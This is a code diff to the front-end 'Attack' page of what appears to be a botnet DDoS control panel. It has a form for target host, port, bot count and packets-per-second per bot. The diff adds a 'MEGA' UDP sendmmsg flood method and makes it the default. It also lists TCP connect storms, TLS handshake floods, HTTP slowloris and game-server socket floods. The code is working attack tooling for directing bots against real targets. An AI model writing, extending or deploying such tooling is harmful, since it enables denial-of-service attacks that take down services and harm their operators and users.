@@ -10,13 +10,14 @@ interface Attack {
   bot_ids: string[]; total_packets: number; started_at: string | null;
 }
 
-/* 5 methods — PSPE/TCP/TLS/HTTP/GAME (server scan optional for multi-port) */
+/* Methods: MEGA | PSPE | TCP | TLS | HTTP | GAME */
 const METHODS = [
-  { id: 'PSPE', desc: 'Port protocol exhaust — multi-port từ C2 scan', cat: 'PORT' },
-  { id: 'TCP', desc: 'TCP connect storm + hold — L4 mọi port', cat: 'TCP' },
+  { id: 'MEGA', desc: 'UDP PPS sendmmsg (base-style) — max volume', cat: 'UDP' },
+  { id: 'PSPE', desc: 'Port protocol exhaust — multi-port', cat: 'PORT' },
+  { id: 'TCP', desc: 'TCP connect storm + hold — L4', cat: 'TCP' },
   { id: 'TLS', desc: 'TLS handshake + GET flood — HTTPS', cat: 'TLS' },
   { id: 'HTTP', desc: 'HTTP/HTTPS pool + slowloris drip', cat: 'HTTP' },
-  { id: 'GAME', desc: 'Socket protocol — game server (NRO)', cat: 'SOCKET' },
+  { id: 'GAME', desc: 'Socket protocol — game server', cat: 'SOCKET' },
 ];
 
 const DEFENSE_LABELS: Record<string, { label: string; color: string }> = {
@@ -32,7 +33,7 @@ export default function Attack({ role = 'user' }: { role?: 'admin' | 'user' }) {
   const { toast } = useToast();
   const [attacks, setAttacks] = useState<Attack[]>([]);
   const [form, setForm] = useState({
-    target_host: '', target_port: 443, method: 'PSPE', duration_secs: 60,
+    target_host: '', target_port: 443, method: 'MEGA', duration_secs: 60,
     pps_per_bot: 100000, bot_count: 1, mega_mode: false,
     payload: '', proxies: '',
     scan_ports: false,
@@ -136,7 +137,7 @@ export default function Attack({ role = 'user' }: { role?: 'admin' | 'user' }) {
         target_port: port,
         method,
         pps_per_bot: pps,
-        mega_mode: method === 'PSPE' || method === 'MEGA',
+        mega_mode: method === 'MEGA',
         slowloris: false,
         tls_exhaust: method === 'TLS' || method === 'TLS_EXHAUST',
         scan_ports: !!form.scan_ports,
@@ -396,7 +397,7 @@ export default function Attack({ role = 'user' }: { role?: 'admin' | 'user' }) {
             <textarea rows={2} placeholder="Leave empty for auto-crafted NRO login packet..." className={`${input} font-mono text-xs`} value={form.payload} onChange={e => setForm(f => ({ ...f, payload: e.target.value }))} />
           </div>
         )}
-        {(form.method === 'PSPE' || form.method === 'TCP') && (
+        {(form.method === 'MEGA' || form.method === 'PSPE' || form.method === 'TCP') && (
           <div className="mb-4 space-y-3">
             <label className="flex items-center gap-2.5 cursor-pointer select-none">
               <input
